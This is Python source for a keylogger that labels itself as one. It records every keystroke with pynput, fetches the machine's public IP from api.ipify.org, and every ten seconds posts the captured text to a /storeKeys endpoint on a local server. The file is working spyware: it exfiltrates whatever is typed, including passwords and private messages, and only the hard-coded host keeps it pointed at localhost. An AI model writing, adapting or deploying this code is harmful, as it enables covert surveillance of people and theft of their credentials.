from pynput import keyboard
from pynput.keyboard import Key, Listener
import requests
import json
import threading


text = ''


localhost = "127.0.0.1"
port_number = "4000"
time_interval = 10


def get_ip_address():
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    return ip_address


def send_post_req():
    global text
    try:
        ip_address = get_ip_address()
        print("Computer IP Address is:" + (ip_address))
        ip_address = ip_address.replace(".", "-")
        data = {ip_address: text}
        payload = json.dumps(data)

        r = requests.post(f"http://{localhost}:{port_number}/storeKeys",
                          data=payload, headers={"Content-Type": "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")


def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.shift_r:
        pass
    elif key == keyboard.Key.cmd:
        pass
    elif key == keyboard.Key.cmd_r:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    print("!!! WELCOME TO KEYLOGGER APP !!!")
    print("!!! APP IS READY TO LISTEN THE KEYS !!!")
    send_post_req()
    listener.join()
